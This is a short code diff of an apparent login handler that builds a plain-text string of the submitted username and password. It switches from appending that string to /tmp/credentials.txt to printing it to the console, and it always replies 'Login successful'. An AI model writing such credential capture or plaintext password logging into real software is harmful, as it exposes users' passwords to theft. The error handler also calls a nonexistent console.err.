@@ -6,7 +6,7 @@ export default async function handler(req, res) {
     const data = `Username: ${username}, Password: ${password}`;
 
     try {
-      fs.appendFileSync("/tmp/credentials.txt", data);
+      console.log(data);
       res.status(200).send("Login successful");
     } catch (err) {
       console.err(err);
